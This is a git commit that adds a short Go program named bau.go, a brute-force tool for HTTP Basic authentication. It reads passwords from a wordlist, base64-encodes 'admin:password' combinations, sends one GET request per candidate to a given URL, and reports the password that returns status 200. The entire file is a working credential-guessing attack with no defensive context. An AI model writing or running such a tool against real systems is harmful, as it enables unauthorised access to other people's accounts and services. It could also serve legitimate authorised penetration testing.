0dd258f9f4ad57686a74cfa843d4b0fa7c7f7f67
Ville-Backelind <villebergbackelind@gmail.com>
2024-12-03 20:57:04 +0100

    first try baby!

---
+++ bau.go
@@ -0,0 +1,57 @@
+package main
+
+import (
+  "net/http"
+  "os"
+  "fmt"
+  "bufio"
+  "flag"
+  "log"
+  b64 "encoding/base64"
+)
+
+
+func main() {
+  var wListFlag = flag.String("w", "", "wordlist")
+  var urlFlag = flag.String("u","", "url")
+  flag.Parse()
+
+  // take wordlist for password and make string admin:pass then b64 encode and send get request with
+  // the encoded as the WWW-authenticate header.
+  wFile, err := os.Open(*wListFlag)
+  if err != nil {
+    log.Fatal(err)
+  }
+  defer wFile.Close()
+
+
+  scanner := bufio.NewScanner(wFile)
+  client := &http.Client{}
+
+  for scanner.Scan() {
+    
+    password := scanner.Text()
+    payload := fmt.Sprintf("admin:%s", password)
+    payloadenc := b64.StdEncoding.EncodeToString([]byte(payload))
+    getHead := fmt.Sprintf("Basic %s", payloadenc)
+    
+    req, err := http.NewRequest("GET", *urlFlag, nil)
+    if err != nil {
+      log.Fatal(err)
+    }
+
+    req.Header.Add("Authorization", getHead)
+
+    res, err := client.Do(req)
+    if err != nil {
+      log.Fatal(err)
+    }
+    defer res.Body.Close()
+
+    if res.StatusCode == 200 {
+      fmt.Println("password for admin is: "+ password)
+    }
+
+  }
+}
+  
